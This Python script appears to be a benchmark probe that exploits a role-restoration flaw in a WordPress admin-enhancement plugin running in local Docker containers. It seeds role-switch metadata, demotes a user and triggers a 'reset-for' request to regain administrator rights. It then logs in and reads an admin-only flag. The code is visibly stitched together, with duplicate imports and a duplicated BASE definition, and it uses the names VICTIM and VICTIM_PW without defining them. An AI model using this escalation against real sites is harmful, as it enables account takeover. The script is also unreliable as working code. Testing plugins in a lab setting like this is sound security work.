#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {"v0": "http://127.0.0.1:39450",
        "v1": "http://127.0.0.1:39451"}
import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path
import requests
SERVICE = {"v0": "wp-v0", "v1": "wp-v1"}
BASE = {"v0": "http://127.0.0.1:39450",
        "v1": "http://127.0.0.1:39451"}
HERE = Path(__file__).resolve().parent
COMPOSE = str(HERE / "docker-compose.yml")
def new_flag():
    return os.environ.get("PCB_FLAG") or "PCBFLAG_UNSET"
X = os.environ.get("PCB_X") or new_flag()
def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    path = candidate.get("demotion_path") if isinstance(candidate, dict) else str(candidate)
    victim = candidate.get("victim", VICTIM) if isinstance(candidate, dict) else VICTIM
    result = {"version": version, "demotion_path": path, "victim": victim}
    try:
        _reset_state(version)          
        _seed_switched_state(version)  
        _demote(version, path)         
        result["reset_for_status"] = _reset_for_attack(base, victim)  
        
        s = _login(base, victim, VICTIM_PW)
        result["flag_read"] = _read_admin_flag(base, s)
        
        role = _wp_eval(version, "$u=get_user_by('login','viewer');echo implode(',',(array)$u->roles);")
        result["viewer_roles_after"] = role.stdout.strip()
    except Exception as e:  
        result["error"] = f"{type(e).__name__}: {e}"
    return result
def _reset_for_attack(base: str, victim: str) -> int:
    
    r = requests.get(f"{base}/", params={"reset-for": victim},
                     timeout=20, allow_redirects=False)
    return r.status_code
def _login(base: str, user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/wp-login.php", timeout=15)
    s.cookies.set("wordpress_test_cookie", "WP Cookie check")
    s.post(f"{base}/wp-login.php",
           data={"log": user, "pwd": pw, "wp-submit": "Log In",
                 "redirect_to": f"{base}/wp-admin/", "testcookie": "1"},
           timeout=15, allow_redirects=True)
    if not any(c.name.startswith("wordpress_logged_in") for c in s.cookies):
        raise RuntimeError(f"login failed for {user}")
    return s
def _demote(version: str, path: str):
    
    if path == "profile_update":
        
        _wp_eval(version,
            "$u=get_user_by('login','viewer');"
            "wp_update_user(array('ID'=>$u->ID,'role'=>'subscriber'));")
    elif path == "set_user_role":
        
        
        _wp_eval(version,
            "$u=get_user_by('login','viewer');"
            "$u->set_role('subscriber');")
    else:
        raise ValueError(f"unknown demotion_path {path}")
def _seed_switched_state(version: str):
    
    _wp_eval(version,
        "$u=get_user_by('login','viewer');"
        "foreach((array)$u->roles as $r){$u->remove_role($r);}"
        "$u->add_role('subscriber');"
        "update_user_meta($u->ID,'_asenha_view_admin_as_original_roles',array('administrator'));"
        "update_user_meta($u->ID,'_asenha_viewing_admin_as','subscriber');"
        "$o=get_option('admin_site_enhancements',array());"
        "$o['viewing_admin_as_role_are']=array('viewer');"
        "update_option('admin_site_enhancements',$o,true);")
def _reset_state(version: str):
    
    _wp_eval(version,
        "$u=get_user_by('login','viewer');"
        "$u->set_role('administrator');"
        "delete_user_meta($u->ID,'_asenha_view_admin_as_original_roles');"
        "delete_user_meta($u->ID,'_asenha_viewing_admin_as');"
        "$o=get_option('admin_site_enhancements',array());"
        "$o['viewing_admin_as_role_are']=array();"
        "update_option('admin_site_enhancements',$o,true);")
def _wp_eval(version: str, php: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "compose", "-f", COMPOSE, "exec", "-T", SERVICE[version],
         "wp", "eval", php, "--allow-root", "--path=/var/www/html"],
        text=True, capture_output=True, check=False,
        env={**os.environ, "PCB_X": X},
    )
def _read_admin_flag(base: str, sess: requests.Session) -> dict:
    
    r = sess.get(f"{base}/wp-admin/admin-ajax.php", params={"action": "pcb_secret"}, timeout=20)
    try:
        body = r.json()
    except Exception:
        body = {"_raw": r.text[:200]}
    return {"status": r.status_code, "body": body}


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))